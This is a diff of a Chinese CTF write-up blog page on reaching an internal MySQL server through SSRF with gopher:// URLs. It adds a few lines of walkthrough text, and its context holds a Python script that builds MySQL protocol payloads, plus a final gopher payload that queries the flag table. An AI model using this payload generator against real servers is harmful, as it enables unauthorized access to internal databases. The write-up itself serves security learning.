@@ -107,10 +107,11 @@
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/ergera.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/ewfgwegeewgwg.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/eherhb.PNG">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/vrwgwrfs.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/rhrhhrjry.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/gftrnhet6666666.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/faefeqfefe.PNG">
-<meta property="og:updated_time" content="2018-07-29T14:51:09.129Z">
+<meta property="og:updated_time" content="2018-08-04T10:14:57.726Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="利用gopher和ssrf操作内网mysql">
 <meta name="twitter:description" content="挺好的一道题 学到了很多">
@@ -366,6 +367,9 @@
 <p><img src="http://otvzfr1o1.bkt.clouddn.com/eherhb.PNG" alt=""></p>
 <p>利用py脚本结合sql语句</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">dump = raw_input(<span class="string">"Give connection packet of mysql: "</span>)</div><div class="line">query = raw_input(<span class="string">"Give query to execute: "</span>)</div><div class="line"></div><div class="line">auth = dump.replace(<span class="string">"\n"</span>,<span class="string">""</span>)</div><div class="line"></div><div class="line">def encode(s):</div><div class="line">    a = [s[i:i + 2] <span class="keyword">for</span> i <span class="keyword">in</span> range(0, len(s), 2)]</div><div class="line">    <span class="built_in">return</span> <span class="string">"gopher://127.0.0.1:3306/_%"</span> + <span class="string">"%"</span>.join(a)</div><div class="line"></div><div class="line"></div><div class="line">def get_payload(query):</div><div class="line">    <span class="keyword">if</span>(query.strip()!=<span class="string">''</span>):</div><div class="line">    	query = query.encode(<span class="string">"hex"</span>)</div><div class="line">    	query_length = <span class="string">'&#123;:x&#125;'</span>.format((int((len(query) / 2) + 1)))</div><div class="line">    	pay1 = query_length.rjust(2,<span class="string">'0'</span>) + <span class="string">"00000003"</span> + query</div><div class="line">    	final = encode(auth + pay1 + <span class="string">"0100000001"</span>)</div><div class="line">    	<span class="built_in">return</span> final</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="built_in">return</span> encode(auth)</div><div class="line"></div><div class="line"><span class="built_in">print</span> <span class="string">"\nYour gopher link is ready to do SSRF : \n"</span></div><div class="line"><span class="built_in">print</span> get_payload(query)</div></pre></td></tr></table></figure>
+<p>查下表名</p>
+<p><img src="http://otvzfr1o1.bkt.clouddn.com/vrwgwrfs.PNG" alt=""></p>
+<p>然后直接查 ssrf.flag</p>
 <p><img src="http://otvzfr1o1.bkt.clouddn.com/rhrhhrjry.PNG" alt=""></p>
 <p>最终payload 成功打到flag</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gopher://127.0.0.1:3306/_%41%00%00%01%85%a6%0f%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%73%73%72%66%5f%75%73%65%72%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%19%00%00%00%03%53%45%4c%45%43%54%20%2a%20%46%52%4f%4d%20%73%73%72%66%2e%66%6c%61%67%3b%01%00%00%00%01</div></pre></td></tr></table></figure>
@@ -406,6 +410,10 @@
       
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/07/31/isitdtuwp/" rel="next" title="isitdtuwp">
+                <i class="fa fa-chevron-left"></i> isitdtuwp
+              </a>
             
           </div>
 
@@ -479,7 +487,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">58</span>
+                <span class="site-state-item-count">61</span>
                 <span class="site-state-item-name">posts</span>
               </a>
             </div>
